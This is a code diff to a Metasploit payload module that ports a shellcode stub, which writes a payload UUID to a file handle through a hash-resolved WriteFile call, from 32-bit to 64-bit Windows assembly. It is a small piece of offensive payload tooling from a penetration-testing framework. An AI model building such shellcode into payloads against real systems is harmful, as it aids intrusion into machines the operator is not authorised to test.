@@ -7,11 +7,11 @@ module Msf
 
 ###
 #
-# Basic write_uuid stub for Windows ARCH_X86 payloads
+# Basic write_uuid stub for Windows ARCH_X86_64 payloads
 #
 ###
 
-module Payload::Windows::WriteUUID
+module Payload::Windows::WriteUUID_x64
 
   #
   # Generate assembly code that writes the UUID to a file handle.
@@ -25,15 +25,18 @@ module Payload::Windows::WriteUUID
 
     asm =%Q^
       write_uuid:
-        push 0                 ; lpOverlapped
-        push 0                 ; lpNumberOfBytesWritten
+        xor r9, r9              ; lpNumberOfBytesWritten
         push #{uuid_raw.length} ; nNumberOfBytesToWrite
+        pop r8
         call get_uuid_address  ; put uuid buffer on the stack
         db #{raw_to_db(uuid_raw)}  ; UUID
       get_uuid_address:
-        push edi               ; hFile
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
-        call ebp               ; call WriteFile(...)
+        pop rdx                 ; lpBuffer
+        mov rcx, rdi            ; hFile
+        push 0                  ; alignment
+        push 0                  ; lpOverlapped
+        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
+        call rbp               ; call WriteFile(...)
     ^
 
     asm
@@ -52,5 +55,6 @@ module Payload::Windows::WriteUUID
 end
 
 end
+
 
 
